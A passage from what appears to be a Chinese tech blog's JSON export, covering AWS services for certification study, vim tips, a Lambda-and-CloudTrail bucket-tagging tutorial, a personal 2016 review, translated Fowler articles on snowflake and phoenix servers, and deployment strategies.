Group）等紧密相关的服务，AWS的一部分服务也是基于EC2的，比如ECS和RDS。使用EC2你可以按照你的需要创建Instance，不仅可以自由控制Instance的数量，还可以动态调整虚拟机的各种参数，比如内存，CPU。最重要的是，使用AWS EC2你可以——按需付费。 EC2 Contianer ServiceECS(EC2 Contianer Service)帮助管理在EC2上运行Docker或容器集群，适用于构建微服务。 注：该服务不会出现在SAA考试中 Elastic BeanstalkElastic Beanstalk是一个用于方便部署web服务的一个傻瓜式应用，你不需要知道关于AWS的一切，只需要上传代码，Beanstalk会帮你选择合适的环境，运行环境，负载均衡，监控等等，目前支持语言包括 Java, .NET, PHP, Node.js, Python, Ruby, Go。 注：该服务不会出现在SAA考试中，只需要知道Beanstalk是什么就可以。 LambdaLambda是一个云计算革命性的服务，关键词Serverless，也是AWS这几年大力在推的服务，主要特点是除了功能性的function以外的所有服务（操作系统，物理硬件，运行环境）都由AWS管理，资源只在被调用时创建并在使用完后立即销毁，最大限度地做到了高可用高伸缩，同时非常便宜，按照访问次数收费。（每百万次0.05美刀）主要使用场景是流处理，应用后端。 注：因为是比较新的服务，所以暂时还没有在SAA考试或样题中出现，但毫无疑问这是AWS一个重要的服务。 LightsailLightsail与Elastic Beanstalk类似，也是一个给不会使用AWS的用户提供自动化部署的一个服务。 注：该服务不算是AWS的核心服务，仅作为了解，考试内容不会涉及。 StorageAWS Storage包含了AWS存储有关的服务，这里暂不列举EBS。 S3S3(Simple Storage Service) 差不多是和AWS一样老的一个服务，同时支撑着AWS中很多其他的服务。S3是一个高可用的对象存储服务，可以理解为一个巨大的磁盘可以存放图片，视频一类的大小静态文件，其存储持久性可达到11个9，可用性可以达到4个9。S3的对象存储单个文件最大可达5TB，总大小不设上限。同时S3可以作为静态网站使用，可以开启版本管理。本博客也准备迁移到AWS S3上。S3的使用场景可以用作静态网站部署，数据存储（例如数据胡泊），用于数据分析，数据备份等。当然也可以用来构建Serverless服务。 ClacierClaier是用于存档数据长期保存的一个服务，如果你有长时间不使用但是需要保存的数据，例如医院的病例，电视台的历史影像资料，你可以使用这个服务，其主要特点是异常便宜（0.004美刀/GB），同时能做到11个9的持久度。另外归档数据在提取时大概需要4-5个小时，所以不适宜存储需要频繁读写的数据。 EFSEFS(Elastic File System)是一个可移动的块存储设备，你可以想象成一个可以任意扩容的移动硬盘，在需要时被接到任何一台EC2 instance上，同时它还具有nfs的功能，可以同时连接多台设备。EFS在刚创建的时候大小为零，随着存放资源增多逐渐扩容，真正做到按需付费，缺点是小贵，大概0.3美刀/GB Storage GatewayStorage Gateway是一个让你的数据中心可以和AWS存储设备无缝对接的服务，你可以像访问本地文件系统一样访问你存储在AWS云上的资源。 注：该服务在Ops认证会被重点考察，SAA涉及不多。 DatabasesAWS Cloud Database涉及到考试，重点在针对不同的使用场景选择合适的数据库服务，另外非关系型数据库的高性能高伸缩和关系型数据库如何做到高可用，读写分离也常会作为考点。 RDSRDS(Relation Database Serveice)是一个托管在AWS上的关系型数据库，目前支持MySQL，Postgresql，SQLserver，MariaDB，Oracle和一个亚马逊自己出的Aurora（据说很屌）。 DynamoDBDynamoDB是AWS提供的非关系型数据库，特点是高一致，低延迟，极易伸缩，相当灵活。 注：该服务在Developor认证考试中重点考察，SAA认证也有涉及。 RedshiftRedshift是托管在AWS上的数据仓库，提供PB级的存储服务。 ElasticacheElasticacheAWS上一个高吞吐的缓存服务，有Redis和Memcached两种类型。 MigrationSnowballAWS官方提供的物理迁移，小型的是一个手提箱，大型的有卡车大小的移动存储，帮助你将大量数据加密传输到亚马逊的云上。关于Snowball一个重要的概念就是Import和Export，你可以从S3导出或导入数据到Snowball。 DMSDMS(Database Migration Service)帮助你将本地数据库中的数据迁移到AWS上，同时还支持在AWS中不同类型的数据库之间做零宕机的数据迁移。比如从本地的Oracle中将数据迁移到AWS的Aurora上。 注：DMS是AWS中一个重要的服务，但暂未出现在SAA的考试中。 SMSSMS(Server Migration Service)AWS服务器迁移服务是一种无代理服务，使租户能够快速将本地服务增量式地迁移到云上，具体就是将本地服务器的卷打成镜像放到云上再跑起来。 注：该服务暂时没有在所有考试中出现。 AnalyticsAnalytics主要用于处理，分析，可视化数据。 AthenaAthena让租户可以使用SQL交互式地查询S3中的数据，Athena是Serverless的，所以用户只需按使用次数付费。 EMRElastic MapReduce，就是托管在AWS上的map reduce，用于管理大数据集群（EC2 instance集群） 注：SAA考试会涉及。 Cloud Search &amp; Elastic Search用于构建站内搜索或应用内搜索。 注：助理级考试均不涉及。 KinesisKinesis强大的实时数据流处理服务，速度可达TB每小时，用于上传，分析实时数据流。比较重要。 Data Pipeline提供有序处理数据，洗数据，数据迁移的工作。 Quick Sight为你的数据创建可视化面板。 Security &amp; IdentityIAMIAM(Identity &amp; Access Management)是AWS的权限管理服务，是一个非常重要的服务。这个服务是免费的，而且Global，即不收Region限制的。关于IAM主要需要知道关于User Group, User, Role, Polic几个概念即可；User Group和User都类似于Linux中的用户组和用户的概念，不同的是AWS根据Polic赋予用户权限，关于Polic，主要就是规定可以对“何种资源”进行“何种操作”两个参数，Role的定义类似于User，但是Role不是赋予用户使用，而是赋予给AWS的资源的，例如租户需要创建一个EC2 instance，这个Instance需要操纵S3的资源，那么你需要在创建这个EC2 instance的时候赋予一个带S3操作权限的Role，需要注意的是Role只能在创建资源的时候被赋予，且不能更改不能解除绑定，另外在包含Role的instance中你无法看到AWS ACCESS KEY 之类的文本文件，这是AWS出于安全的设计。 InspectorInspector是一个安装在EC2 instance上的客户端，用于生成安全报告。 注：暂不在考试中出现 Certificate ManagerCertificate Manager是一个用于管理SSL证书的服务。 Directory ServiceDirectory Service让租户可以将AWS权限管理和自建数据中的AD group集合在一起，可以直接使用Microsoft AD Group创建AWS中的资源。 WAFWAF(Web Application Firewall)给予租户应用级别的安全防护，比如SQL注入，跨站攻击，等。 Artifact这是让你能访问到AWS compliance document 的服务，可以从中获取各种合规文件。 Management ToolsCould WatchCloud Watch 是AWS重要的Ops工具，作用为监控AWS资源状态的工具，可以设置连个级别，分别是五分钟一个心跳（默认）和一分钟一个心跳。该服务监控类目(Metrics)繁多，甚至包括花费的监控预警，可以设置Alarm触发SNS给到租户通知实现报警的功能。 Cloud FormationCloud Formation是AWS一个重要的DevOps工具，实践了基础设施及代码，租户可以使用一套模板（Template），即一个Json或者Yaml的文件定义整个AWS服务的使用，包括资源，网络，权限。是一个可以投入大量精力使用学习的一个服务。 注：Cloud Formation是一个重要的服务，但不会在SAA考试中出现很多，只需要一定程度的了解即可，但想成为一个真正的架构师，这个服务必须要熟悉。 Cloud Trail用于监控AWS API调用的一个服务，哪些操作属于AWS API调用——创建一个资源，改变一个资源的配置，销毁一个资源，往S3上传一个对象，都算。这些操作被Cloud Trail记录下来保存在S3中作为log供租户使用，AWS的一些边缘服务也有依赖于Cloud Trail的。但笔者在使用该服务时发现其存在延迟时间长（10-20min），无法划分日志级别，且日志冗余不易分析等缺点，仍不是很好用。 OpsworksAWS提供的有一个基础设施及代码的工具，使用Chef。 ConfigConfig是用于记录资源配置规则变更，并判断资源配置是否合规的一个服务。 注：该服务不会出现在助理级考试中，但会在Security的考察中出现。 Service Catalog &amp; Trusted AdvisorTrusted Advisor是一个有意思的服务，从安全，省钱，性能，容错四个角度给你的AWS资源配给一个全面的分析，这四个角度也是AWS架构师设计一个良好的架构必须要考虑的四个角度。且该服务与AWS收费等级强相关，AWS的服务等级分为基础版、开发版、商业版、企业版四个级别，交的钱不同会高度体现在这个服务的内容上。https://aws.amazon.com/premiumsupport/compare-plans/ Application ServicesStep FunctionsStep Functions是在2017年初才推出的一个新服务，可用于执行批处理脚本。 注：因为该服务还很新，暂未出现在认证考试中 SWFSWF(Simple Workflow Service)让开发者可以按顺序执行一些后台命令，如果您的应用程序的步骤需要超过500毫秒的时间来完成，您需要跟踪处理状态，如果任务失败，您需要恢复或重试，Amazon SWF可以做到。 注：这个服务比较重要，需要动手实践。 API GatewayAPI Gateway是AWS一个Serverless有关的重要的服务，常用于触发Lambda function。 注：这个服务在构建无服务架构的时候非常重要，但不会在考试中涉及很多细节，只需要了解其作用，用法即可。 Elasic Transcoder用于视频转码。 Message消息服务是AWS一个非常重要的服务，我们可以通过SNS(Simple Noticfication Service)发送短信，邮件提示，使用SQS（Simple Queue Service）构建一个保证交付的消息队列，使用SES(Simple Email Service)收发邮件。 Desktop &amp; App Streamingworkspace一个在AWS云端的远程办公桌面。 AppStream2.0AppStream可以将桌面应用程序流式传输到运行Web浏览器的任何设备，安全地从任何地方即时访问桌面应用程序，如AWS console。 参考资料 https://www.linuxnix.com/amazon-aws-regions-vs-availability-zones-vs-edge-locations-vs-data-centers/","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"云计算","slug":"云计算","permalink":"https://www.duyidong.com/tags/云计算/"}]},{"title":"vim学习小计","date":"2017-02-24T07:41:09.000Z","path":"2017/02/24/vim学习小计/","text":"说起来，从接触Linux到现在，使用Vim大概有一年的时间，大部分时候主要在编辑一些配置文件，查看文档使用。算不上vim的高级玩家，在此主要针对vim的一些常见使用场景做一个命令汇总。 打开文件vim -On file1 file2 # 左右打开两个文件 vim -on file1 file2 # 上下打开两个文件 vim -d file1 file2 # diff 编辑常用数字+hjkl 上下左右 ^ $ 跳转到行首行位 gg G 首行 尾行 aAoO 插入在前后上下 数字+yy 数字+pp 复制粘贴 通过c-f向下翻页，c-b向上翻页；c-e逐行下滚，c-y逐行上滚。这在几乎所有Unix软件中都是好使的，比如man和less。 H可以移动到屏幕的首行，L到屏幕尾行，M到屏幕中间。 zt可以置顶当前行，通常用来查看完整的下文，比如函数、类的定义。 zz将当前行移到屏幕中部，zb移到底部。 多行编辑最常用的编辑即为块注释和块取消注释: c-v 向下选中要被注释的行 # 选中模式 I # insert，在首行插入注释符 Esc # 推出即将首行更改应用到选中行 取消块注释差不多，选中之后x即可 多窗口编辑:split file 横屏打开一个文件 :vsplit file 竖屏打开一个文件 c-w hjkl 上下左右切换活动窗口 c-w w 顺序切换 c-w HJKL 上下左右移动窗口 vim有多标签功能Tag，但我觉得用得很少，在此不表另外用得比较多的，前后台切换（这个其实是Linux的用法）： 切换到后台: c-z 切换到前台： fg 回车 退出ZZ 保存退出 ZQ 不保存退出 其他显示行号： :set nu设置编码： :set encoding:utf-8美化json: :%!python -m json.tool全局替换: :%s/被替换的/替换后的/g解决粘贴时跳行问题: :set paste","tags":[{"name":"vim","slug":"vim","permalink":"https://www.duyidong.com/tags/vim/"},{"name":"工具","slug":"工具","permalink":"https://www.duyidong.com/tags/工具/"}]},{"title":"Lambda初体验","date":"2017-02-23T10:23:00.000Z","path":"2017/02/23/Lambda初体验/","text":"使用Lambda和CloudTrail给新创建的bucket打上tag 背景介绍什么是LambdaAWS Lambda提供了一个不需要服务器就能运行代码的平台，有以下特点： 高伸缩：适用于一天数次的访问频率到一秒数千次的访问量，横向纵向灵活扩展 按需付费：你只需要根据访问量付费，价格非常便宜（$0.20每百万次访问） 高可用：AWS负责维护代码运行的环境，使用者无需操心底层资源的配置，性能，维护 支持语言：目前官方支持NodeJS, java, C#, Python, 有第三方工具可以支持多种语言 事件响应：Function是Lambda的计算单元，可以由各种事件触发，这个事件可以是由AWS内部的资源发出的，也可以来自AWS外部。（比如往S3存放一个文件，或者一个HTTP请求） 使用场景： 构建一个数据触发的程序用于处理数据，处理Amazon Kinesis中存储的流数据 构建一个微服务后端的一个模块，配合API Gateway用于响应HTTP事件 什么是CloudTrail用于记录和追踪AWS内部的各种API调用，你可以在CloudTrail的日志中找到所有该账户在AWS中操作资源的事件，包括Console操作，SDK，AWS CLI，以及跟高级服务的调用。 你可以在事件中找到资源调用者的用户信息，源IP，以及调用时间。 使用Lambda和CloudTrail实现创建一个S3 bucket自动打上创建者的tagCouldTrail 会把所有监控到的API调用的时间写到S3 bucket里的日志文件中，同时产生一个event时间，我们要做的就是用这个event事件触发一个Lambda function，调用AWS的SDK获取API调用日志，当发现日志里出现了CreateBucket事件的时候，给这个bucket打上形如“Owner:dyd”的tag。 非常类似于这个功能不过最后吧SNS换成了打tag。 AWS CloudTrail把日志保存在S3中 S3 发出一个s3:ObjectCreated:*的事件触发了Lambda function，这个配置在Lambda中实现 Lambda使用你创建function时赋予的role来执行function Lambda获取S3的事件作为一个参数，确定CloudTrail的日志存放在S3中的位置，进而读取日志，当日志中出现eventName=CreateBucket的事件的时候，获取该事件对应的BucketName和UserName，调用AWS S3 SDK 使用S3 SDK给对应的bucket打上包含UserName的tag Step by Step第一步，创建一个Trail首先你得有一个AWS账号，选择一个Region，进入CloudTrail的界面。选择左侧Trail -&gt; Add new Tail，填写如下信息 Trail Name: Trail的名字，只需要不于同Region的CloudTrail重名即可Apply trail to all regions: 是否需要在所有Region都使用这个CloudTrail，否则只监听CloudTrail所在Region的API调用事件。S3 bucket: 用于存放CloudTrail日志 填选好后点选Create 点击新创建的Trail你可以进行配置，确认右上角log为打开状态。过一会儿你就可以在API activity history里看到如下所示的一些event事件了，主要包含事件触发的用户名，时间名称，类型，资源名称。 第二步：为Lmabda function创建一个role进入 IAM -&gt; Roles， 点击 Create New Role，输入Role的名字，点选下一步：选择 AWS Lambda，下一步：绑定一个Polly这里因为我们除了读取S3的object还需要给S3的bucket打tag的权限，所以方便起见选择AmazonS3FullAccess，另外这个Role需要执行Lambda的权限，所以还需要选择AWSLambdaFullAccess，最后，确认 -&gt; 创建 第三步：创建Lambda function进入Lambda的界面点选Create a Lambda function在Select blueprint的页面选择python2.7的运行环境，选择s3-get-object-python作为预配置 Configure Triggers 页面选择存放CouldTrail日志的S3 Bucket, 事件类型选 Object Created，勾选上Enable Trigger。 点击Next，输入Name，选择Role Name为上一步创建的Role，其他保持默认，Next -&gt; 确认配置 -&gt; Create function 这里关于Lambda的部署方式，在生产中一般使用打包上传的方式，这里我们的案例比较简单，就直接在consloe上编辑了。 第四步： 获取测试数据首先你需要测试你的Function能够被正常Trigger并拿到测试数据，所以你需要取消注释掉lambda_hander里面的第一行： print(&quot;Received event: &quot; + json.dumps(event, indent=2)) 余下的不用管，点击test，你可以在Log output中看到你的测试内容，即event事件，即可。 接下来你需要取得一份样本数据用于测试，最简单的方法就是创建一个S3 bucket，这里一定要注意，创建的bucket需要和CloudTrail在同一个Region，否则事件是无法被捕获的。进入S3 -&gt; Create bucket 快速创建一个Bucket: 稍等数分钟，这里会有十几分钟的延迟，在Cloudwatch中查看Lambda打印的log：进入Cloudwatch -&gt; Logs -&gt; 对应Lambda名称的Log Group -&gt; 找到时间点对应的Log Stream，filter你的bucket名字你会发现一条这样的Log: { &quot;Records&quot;: [ { &quot;eventVersion&quot;: &quot;2.0&quot;, &quot;eventTime&quot;: &quot;2017-02-23T13:42:18.654Z&quot;, &quot;requestParameters&quot;: { &quot;sourceIPAddress&quot;: &quot;54.224.144.182&quot; }, &quot;s3&quot;: { &quot;configurationId&quot;: &quot;fa401b72-97f2-48e8-9b74-b8d2a726a771&quot;, &quot;object&quot;: { &quot;eTag&quot;: &quot;25c76ac2f0284796baacebca934c3875&quot;, &quot;sequencer&quot;: &quot;0058AEE6BA925A5848&quot;, &quot;key&quot;: &quot;AWSLogs/994910148131/CloudTrail/us-east-1/2017/02/23/994910148131_CloudTrail_us-east-1_20170223T1340Z_nIJHY6wtS6EQRUtz.json.gz&quot;, &quot;size&quot;: 17181 }, &quot;bucket&quot;: { &quot;arn&quot;: &quot;arn:aws:s3:::yidongtrail&quot;, &quot;name&quot;: &quot;yidongtrail&quot;, &quot;ownerIdentity&quot;: { &quot;principalId&quot;: &quot;A1EKSBYVFNIFR0&quot; } }, &quot;s3SchemaVersion&quot;: &quot;1.0&quot; }, &quot;responseElements&quot;: { &quot;x-amz-id-2&quot;: &quot;jN1tHU9s2/Y1RvA31IG34MhbHiAtB/45v938qdzsff2ufgZ8v5osNCcPKNWVrlnuh4qTs/J0odg=&quot;, &quot;x-amz-request-id&quot;: &quot;57FBF80C150FB0CE&quot; }, &quot;awsRegion&quot;: &quot;us-east-1&quot;, &quot;eventName&quot;: &quot;ObjectCreated:Put&quot;, &quot;userIdentity&quot;: { &quot;principalId&quot;: &quot;AWS:AROAI6ZMWVXR3IZ6MKNSW:i-012030f0061c32dcd&quot; }, &quot;eventSource&quot;: &quot;aws:s3&quot; } ] } 这就是我们要的测试数据 编写Function函数把上一步得到的json文件放到Lambda的“单元测试”（我是这么理解的）里：选中你的Function -&gt; Actions -&gt; Configure test event，直接把这个json粘贴进去。 下面你可以一边写代码一边运行测试。我得说AWS console的这个工具确实不太好用，推荐自行谷歌好用的第三方工具做这个事。我是在本地进行测试和断点调试的。写好的代码在这里，可以作为参考：https://github.com/ADU-21/test_lambda/blob/master/lambda.py 保存测试通过之后，你可以再尝试创建一个bucket，这个bucket在创建完成后十几分钟会被自动打上一个tag. 总结Tag作为AWS官方推荐的管理资源计费的方式却并没有提供相应的接口给每个用户创建的资源打上自己的tag，我做这个实验的初衷原本是想通过这种方式给所有的AWS资源都打上tag，但是在操作过程中发现CloudTrail的日志并没有想象中那么容易过滤出有用信息，比如Create Instance这个动作并不会只有一个CreateInstance的event时间被产生，而是会在长达数十分钟的时间里产生多个RunInsatance的事件，时间延迟也是一个不小的问题，关于资源管理，还需要探索更好的方案。","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"Serverless","slug":"Serverless","permalink":"https://www.duyidong.com/tags/Serverless/"},{"name":"无服务器架构","slug":"无服务器架构","permalink":"https://www.duyidong.com/tags/无服务器架构/"},{"name":"Lambda","slug":"Lambda","permalink":"https://www.duyidong.com/tags/Lambda/"}]},{"title":"2016 野蛮生长的一年","date":"2017-01-16T08:35:41.000Z","path":"2017/01/16/2016大事记/","text":"15年的尾声15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？ 成为一枚程序员之前的工作只是在码代码，对于代码的意义，如何成为一个网站，以及网站如何发挥它的价值是一无所知的，好在coding的内容都比较有趣，一边发掘着网络世界的神奇，一边学习养家糊口的本事。从一开始的爬虫，到社工库，到端口扫描，对网络世界的认识逐步提高；从一开始不知道自己在做什么，到后来两周做的网站卖了三十万，到后来觉得技术可以改变世界；我一天天成长着，直到找工作开始，我才算是真正的成为一名程序员，时间大概是在三月份左右，我笨手笨脚的搭建了自己的博客，开始系统回顾大学所学的知识，总结涉足IT行业半年以来的经验，研读一些自己没有遇到过但是别人遇到了的问题，对技术的态度由”讨口饭吃”，穿变成一种兴趣，对曾经不削一顾的计算机，竟然开始心心相惜。 跳槽时间大概是在四月份，我收到一封拉勾网的回复，”ThoughtWorks的HR对你的简历感兴趣“，当时已经拿到软通的offer，薪资不低，且有华为靠山；但比较顾虑软通工作环境不佳，会对个人发展不利；抱着试一试的想法在清明陪爷爷奶奶游玩九寨沟期间给HR发了一封自荐邮件，假期结束后当即收到了Cherry的邮件回复，欢呼雀跃之余感叹这是我理梦想最近的一次。大概在年初的时候我就来过一次软件园，当时在天府五街的地铁站前，感叹这里的办公楼都好大气，因为在北京真的没见过什么正儿八经的写字楼，于是发誓将来一定要在这里上班，加上好友引荐，早就觉得ThoughtWorks是一家女神一样的公司，宽松的文化，舒适的办公环境，有很多技术大牛，入职居然还配mac电脑，哈哈，当时就这样被这家公司吸引着。后来大概花了两周时间一边上班一遍翻完了大学四年的教材，在网上看了很多python的博客，提交homework， homework过了，通知到公司面试，逻辑测试, pair, 有种不过如此的感觉，不过还是认真对待，最终拿到offer，已经是五月了。 复合拿到TW的offer之后果断拒绝了软通，也不再想面其他公司了，安心租房，过了一段自由自在的日子。入职TW前期压力是比较大的，比找工作时更大强度的学习任务，更high-level的认知模型，在TW的最初两个月一度认为自己原来对软件开发一无所知，在此期间很感谢我的buddy给我的指引，还有好玩的同事们的帮助，海外项目组很轻松，又有很多高智商的人一起工作，没有以前公司经常可见的那种眼神呆滞的人，这样的环境让我觉得很舒服，成长也很快，在做过几次session，准备一段时间AWS认证考试无果之后，终于roll off了 出差北京大概是在11月份的时候，天很冷，而且我知道这个时候北京又雾霾，但是没有办法，我还是降临了北京，国内项目组比较辛苦，节奏比较快，度过了最初一个星期7*14小时的工作后慢慢适应了，几乎找到一些上一家公司的感觉，实践了一些反模式再回过头来看海外交付组的最佳实践，不觉暗暗点头，有道理。国内交付的小伙伴们都很活跃，项目压力越大明显感到项目组氛围更好，在这里我学会了阿瓦隆，也了解到很多公司的八卦。圣诞节项目上线之后，年底feedback，很快我又roll off 了。 家人来成都元旦，2017结束了。很多人都在总结，计划着新的一年新的开始，虽然感觉和大学时候的计划有所不同，但计划还是要有的，flag还是要立，哈哈，新年伊始，不能亏脑袋，毕竟在我精力最旺盛的年龄，我又是一个如此爱用脑的人。 2017盘算着制造几件大事 考取AWS专家级认证 考取阿里云认证 争取一次Lead的机会 参加公司招聘 比较深入的研究云，PaaS服务 了解性地学习学习算法，人工智能，区块链","tags":[{"name":"大事记","slug":"大事记","permalink":"https://www.duyidong.com/tags/大事记/"}]},{"title":"一句话介绍DevOps是做什么的","date":"2016-11-11T01:42:58.000Z","path":"2016/11/11/一句话介绍DevOps是做什么的/","text":"DevOps是一个很广泛的概念，他是一个运动，一种文化，强调团队紧密合作，以快速反馈的手段达到团队目标为交付最终价值的效果。 DevOps延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等。每一种实践落实到行动上就要使用一些工具，比如基础设施及代码我们会引入很多配置管理工具，比如Ansible,puppet,chef,salt。可视化这一块可能会涉及到一些PaaS平台，比如AWS，Rancher等等。持续集成持续部署这一块主要就是一些CI 工具，Jenkins，GOCD，等等。 第二版DevOps承袭自敏捷系统管理，是一种重视软件开发人员与IT运维人员之间沟通合作的技术运动。近年来，随着云计算、虚拟化等技术的迅猛发展及敏捷实践在业内的普及，质量内建、基础设施即代码、部署流水线、服务监控与健康检查、分布式问题定位及追踪等诸多DevOps实践也在各大公司IT项目中得到探索和应用。开发、测试、运维团队之间的协作性得到提高，生产环境的发布风险明显降低，缩短了持续交付的迭代周期，从而提升了组织效率，对业务连续性也起到了积极作用。因此，DevOps运动获得了越来越多从业者的认可。","tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"}]},{"title":"雪花服务器","date":"2016-11-04T07:29:52.000Z","path":"2016/11/04/翻译-雪花服务器/","text":"原文链接: http://martinfowler.com/bliki/SnowflakeServer.html 保持生产环境服务器正常运行可能是一件非常繁琐的事，你必须保证你的操作系统和应用运行的环境被及时的修补以确保是最新版本。被托管的应用需要被经常升级。应用所处的环境也需要实时调整来配合应用有效运行即与其他系统正常通信。这些操作都依赖于命令行，GUI，或者编辑配置文件。导致的结果就是“雪花服务器” ———— 对数据中心带来不好的影响 雪花服务器的第一个问题就是很难被复制。如果你的服务器硬件有问题，这就意味着你很难启动另一个服务器来提供相同的服务。如果你需要一个集群，你不能保证你启动的所有instance都是同步的。你不能复制一个产品环境来测试。当你的产品环境挂了，你将无法在你的开发测试环境重现这个错误。 给你的雪花服务器创建镜像或许是一个解决方案，但是镜像往往会打包很多你不需要的配置，更别说错误也会被一同打包。 然而，雪花服务器真正的脆弱，是在你需要改变他们的时候。雪花服务器很快就会变得难以理解和难以更改。对服务器的细微更改可能会引起一连串的连锁反应。你不确定配置的那一部分是重要的，哪些是遗留的。它的脆弱导致长时间，压力巨大的调制和debug。你需要手动流程和文档来支持你需要的更改。这也是为什么我们通常会看到很多重要的软件会运行在一个非常老旧的操作系统里。 避免雪花服务的一个好的方式是以某种自动化的方式掌握整个运维过程的配置。Puppet和chef都可以做到这点，你可以用修改配置文件的方式将修改应用到你所有的环境中。 自动化配置管理的的好处不仅是你可以重新build一个新的server，更重要的是你可以很容易知道你对一台服务器进行了什么样的配置，从而可以很容易更改。更长远的看，既然配置文件是文本格式，你可以把它纳入版本管理，就实现了基础设施即代码的好处。 应用部署需要遵循一个简单的准则：完全自动化，所有改变纳入版本管理。通过避免雪花服务，可以带来的好处是你可以完全复制你的产品环境来进行测试，减少配置误差导致的缺陷。 一个很好地方式确保你不会陷入雪花服务器的困境就是使用凤凰服务。对配置进行版本管理是持续交付的重要部分。","tags":[{"name":"翻译","slug":"翻译","permalink":"https://www.duyidong.com/tags/翻译/"},{"name":"雪花服务器","slug":"雪花服务器","permalink":"https://www.duyidong.com/tags/雪花服务器/"}]},{"title":"凤凰式服务","date":"2016-11-02T09:06:13.000Z","path":"2016/11/02/翻译-凤凰式服务/","text":"原文链接： http://martinfowler.com/bliki/PhoenixServer.html 有一天我突然幻想一个验证运营的服务，这个服务就是我如果跑去把公司的数据中心关掉，这毫无疑问将至我们公司的产品服务于危机之中，而这个服务的评定标准则是运营图团队需要花费多少时间能让我们的产品应用重新恢复正常。 这或许只是个幻想，但其中包含着金子一样的智慧，你完全可以尝试定期毁掉你的服务器，一个服务应该像凤凰，定期从灰烬里重生。 凤凰式服务首要的好处是避免配置飘移（Configuration dirft）：对操作系统指定的更改不会被记录，配置飘逸是一个巨大的泥潭，你不会希望被陷进去的。 一个解决配置漂移的方法就是用一个软件自动地同步服务器配置达到一个已知的统一标准。Puppet和Chef（还有Ansible和salt）两个工具都可以做到这点，不停的重复申请他们定义的资源（所以他们也可以用于实践凤凰式服务），但这些工具的局限性是他们只能控制他们定义的那一部分配置，在他们定义以外的配置漂移不会被修复。而凤凰是从无到有的，它可以覆盖所有的资源配置。 但这并不是说重复应用配置是无用的，毕竟它更快，破坏性也更小。他对解决配置飘移仍是有用的。 e.g.知名网站Netflix有一个chaos monkey专门用来随机毁掉一些服务来确保他们服务的弹性（高可用性）。 注： 配置飘移?Configuration Dirft大意：在一个生产环境的服务器中，比如一个数据库集群，由于数据库密码变动导致主从数据库不一致，或者在使用脚本去更改服务器配置的过程中让同一个环境下的服务器发生了配置不一致的情况.参考链接： http://kief.com/configuration-drift.html http://www.continuitysoftware.com/blog/what-is-configuration-drift/ https://cdn2.hubspot.net/hub/166743/file-22343462-pdf/docs/cios-guide-to-avoid-configuration-drift.pdf","tags":[{"name":"翻译","slug":"翻译","permalink":"https://www.duyidong.com/tags/翻译/"},{"name":"凤凰式服务","slug":"凤凰式服务","permalink":"https://www.duyidong.com/tags/凤凰式服务/"}]},{"title":"部署和发布策略的演进","date":"2016-10-24T06:30:20.000Z","path":"2016/10/24/部署和发布策略的演进/","text":"持续交付的目的以下问题有没有解决？“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？ 部署和发布的区别要弄清楚部署和发布的区别，首先要弄清楚几个名词之间的关系CI(Continues Intergation)持续集成，CD(Continues Delivery)持续交付，持续集成的目的是对代码的快速反馈，在分布式开发的团队中你的更改不会破坏已有代码功能，持续交付的scope要大一些，指的是对用户交付最终价值，传统的交付最终价值即为产生可发布的版本，有的公司在持续交付的基础之上甚至提出了持续部署（Continous Deployment），即自动化讲可发布版本放入到产品环境，其中就涉及到蓝绿部署，滚动部署等部署方式。在部署和发布解耦之后，在将产品部署到产品环境之后我们可能还有些功能是不想对用户可见的，在对用户可见的的这个过程我们称之为发布（Release）（如图）。DevOps运动则是在发布之后有引入运维和运营的角色，和用户反馈一起形成一个闭环。恩，差不多是这个样子的。 ThoughtWorks在15年的技术雷达上已经建议解耦部署和发布: # 零宕机发布（目标） ```零宕机发布指的一种将用户从一个版本几乎瞬间转移到另一个版本上的方法，更重要的是，如果出了什么问题，他还要能在瞬间把用户从这个版本转回到原先的版本上。 零宕机发布的关键在于将发布流程中不同的部分解耦，尽量使他们能独立发生。 凤凰式部署将产品环境和应用打包发布，在容器产生之前是将系统和应用制作镜像的方式进行发布，避免产品环境和非生产环境不一致导致发布失败，但是这种发布方式因为笨重而被容器取代。 便于回滚 提高计算资源的利用率：相对以操作系统为计算单元的管理方式，容器不仅更轻量而且极大提高了计算资源的利用率，且容器本身不占用计算资源。而且相对image的方式，管理成本，备份的cost也极大降低 更快的部署时间：image的方式需要一天，snapshot需要十分钟，Container则可以把这个时间缩短到秒级 解决了环境不一致的问题 跨平台 prodocut team over project team:每个team可以更方便的管理自己的platform资源，极大地降低了team之间的沟通成本。（相对application team和platfor team分离的情况） 风险：安全，容器必须是以root权限泡在宿主机上，不同容器共享一个宿主机，如果一个容器被贡献则会威胁到所有在改宿主机上的服务。解决方案： 及时更新宿主机系统版本，避免内核漏洞 扫描bese image, 避免Container本身系统漏洞 base image可以加入主动防御（e.g.ossec） 控制好容器操作权限 滚动发布(Rolling Release)又称滚动更新(rolling update)指的是在不切换负载均衡器或者DNS的前提下把负载均衡器下的机器一台台关掉，部署好之后再挂到负载均衡器下面，与蓝绿部署直观的差别是不需要切换负载均衡器或DNS，同时做到零宕机部署。（还要完善） 蓝绿部署（BuleGreen Deployment）在发布之前就把应用程序放在产品环境上部署好，如果“发布”能像重新配置一下路由器那样简单，让他直接指向生产环境，那就更好了 ————《持续交付》蓝绿部署主要解决的是宕机发布的问题。它的主要原理是在保持旧版本环境（绿环境）正常运行的情况下，准备一套蓝环境，在产品环境里蓝环境通过充分冒烟测试后再将用户访问从绿环境切换到蓝环境，如果蓝环境在这个切换之后出现问题则立即切换回绿环境，如果没有问题则最后destroy掉绿环境，具体做法可以通过DNS或者ELB配合AutoScaling 